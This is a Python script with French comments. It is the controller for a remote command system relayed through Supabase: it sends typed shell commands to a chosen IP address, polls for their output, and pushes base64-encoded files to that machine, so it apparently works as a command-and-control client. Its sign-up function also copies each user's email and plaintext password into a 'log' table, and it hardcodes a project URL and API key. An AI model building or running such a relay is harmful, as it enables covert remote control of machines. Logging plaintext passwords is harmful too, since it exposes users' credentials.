from supabase import create_client
import os  # Pour gérer les chemins
import time  # Pour les pauses
import sys  # Pour quitter proprement le script
import base64  # Pour encoder et décoder les fichiers en base64

# Configuration Supabase
SUPABASE_URL = "https://isglyvyafrpnvoxjcgjy.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlzZ2x5dnlhZnJwbnZveGpjZ2p5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDQ5MDQ0NTMsImV4cCI6MjA2MDQ4MDQ1M30.Fw6qoLSQGty7PsYGxh8krxt-JCSIN9Nd1r4kMRLfU9I"

supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

# Variable globale pour stocker l'utilisateur connecté
current_user = None


def create_user():
    """Créer un nouvel utilisateur."""
    print("=== Création d'un nouvel utilisateur ===")
    email = input("Email : ").strip()
    password = input("Mot de passe : ").strip()

    try:
        response = supabase.auth.sign_up({
            "email": email,
            "password": password
        })

        if response.user:
            print(f"[✅] Utilisateur créé avec succès : {response.user.email}")
            user_info = {"email": email, "password": password}
            supabase.table("log").insert(user_info).execute()
        else:
            print(f"[❌] Erreur : {response}")
    except Exception as e:
        print(f"[‼️] Exception lors de la création de l'utilisateur : {e}")


def login_user():
    """Connecter un utilisateur."""
    global current_user  # Utiliser la variable globale pour stocker l'utilisateur connecté
    print("=== Connexion d'un utilisateur ===")
    email = input("Email : ").strip()
    password = input("Mot de passe : ").strip()

    try:
        response = supabase.auth.sign_in_with_password({
            "email": email,
            "password": password
        })

        if response.user:
            current_user = response.user  # Stocker l'utilisateur connecté
            print(f"[✅] Connexion réussie : {response.user.email}")
        else:
            print(f"[❌] Erreur : {response}")
    except Exception as e:
        print(f"[‼️] Exception lors de la connexion : {e}")


def main_menu():
    """Afficher le menu principal."""
    global current_user  # Utiliser la variable globale pour vérifier l'état de l'utilisateur connecté
    while True:
        if current_user:  # Si un utilisateur est connecté, passer directement au menu des commandes
            print(f"[✅] Bienvenue, {current_user.email} !")
            main_menu2()
            break

        print("""
=== Menu Principal ===
1. S'inscrire
2. Se connecter
3. Quitter
        """)
        choix = input("Votre choix : ").strip()
        if choix == "1":
            create_user()
        elif choix == "2":
            login_user()
        elif choix == "3":
            print("Au revoir !")
            sys.exit(0)
        else:
            print("[❌] Choix invalide. Veuillez réessayer.")


def main_menu2():
    """Gérer les commandes et interactions avec Supabase."""
    destinataire = input("Donner l'adresse IP du PC avec qui vous voulez communiquer : ").strip()
    actual_path = os.getcwd()  # Initialiser le chemin actuel avec le répertoire courant
    print(f"[📂] Chemin actuel : {actual_path}")

    while True:
        print("""
=== Menu Commandes ===
1. Envoyer une commande
2. Partager un fichier
3. Quitter
        """)
        choix = input("Votre choix : ").strip()

        if choix == "1":
            print("=== Mode envoi de commandes ===")
            print("Tapez 'exit' pour revenir au menu principal.")
            while True:
                # Afficher le chemin actuel dans l'invite de commande
                commande = input(f"{actual_path} > ").strip()
                if commande.lower() == "exit":
                    print("Retour au menu principal.")
                    break

                # Gérer les commandes `cd` pour changer le chemin
                if commande.startswith("cd "):
                    new_path = commande[3:].strip()
                    try:
                        new_path = os.path.expanduser(new_path)  # Convertir `~` en chemin absolu
                        os.chdir(new_path)  # Changer le répertoire courant
                        actual_path = os.getcwd()  # Mettre à jour le chemin actuel
                        print(f"[📂] Chemin changé : {actual_path}")
                    except FileNotFoundError:
                        print(f"[❌] Répertoire introuvable : {new_path}")
                    except Exception as e:
                        print(f"[‼️] Erreur lors du changement de répertoire : {e}")
                    continue

                # Préparer les données pour Supabase
                commande_data = {"commande": commande, "pour": destinataire, "path": actual_path}
                try:
                    # Insérer la commande dans la table et récupérer la réponse
                    response = supabase.table("commandes").insert(commande_data).execute()

                    if response.data:
                        commande_id = response.data[0]["id"]  # Récupérer l'ID de la commande insérée
                        print(f"[✅] Commande ajoutée avec succès. ID de la commande : {commande_id}")

                        # Boucle pour vérifier la colonne "result"
                        while True:
                            try:
                                result_response = supabase.table("commandes").select("result").eq("id", commande_id).single().execute()
                                if result_response.data:
                                    result = result_response.data.get("result")
                                    if result:
                                        print(f"[✅] Résultat de la commande {commande_id} : {result}")
                                        break
                                    else:
                                        print(f"[⏳] En attente du résultat pour la commande {commande_id}...")
                                else:
                                    print(f"[⚠️] Aucune commande trouvée avec l'ID {commande_id}.")
                            except Exception as e:
                                print(f"[‼️] Exception lors de la vérification du résultat : {e}")
                            time.sleep(5)
                    else:
                        print("[❌] Erreur lors de l'ajout de la commande.")
                except Exception as e:
                    print(f"[‼️] Exception lors de l'ajout de la commande : {e}")

        elif choix == "2":
            print("=== Partage de fichier ===")
            file_path = input("Chemin du fichier à partager : ").strip()
            try:
                # Lire et encoder le fichier en base64
                with open(file_path, "rb") as file:
                    file_content = file.read()
                    encoded_file = base64.b64encode(file_content).decode("utf-8")

                # Préparer les données pour Supabase
                file_name = os.path.basename(file_path)
                file_data = {"file_name": file_name, "file_content": encoded_file, "pour": destinataire}
                response = supabase.table("fichiers").insert(file_data).execute()

                if response.data:
                    print(f"[✅] Fichier '{file_name}' partagé avec succès.")
                else:
                    print("[❌] Erreur lors du partage du fichier.")
            except FileNotFoundError:
                print(f"[❌] Fichier introuvable : {file_path}")
            except Exception as e:
                print(f"[‼️] Erreur lors du partage du fichier : {e}")

        elif choix == "3":
            print("Au revoir !")
            break
        else:
            print("[❌] Choix invalide. Veuillez réessayer.")


if __name__ == "__main__":
    main_menu()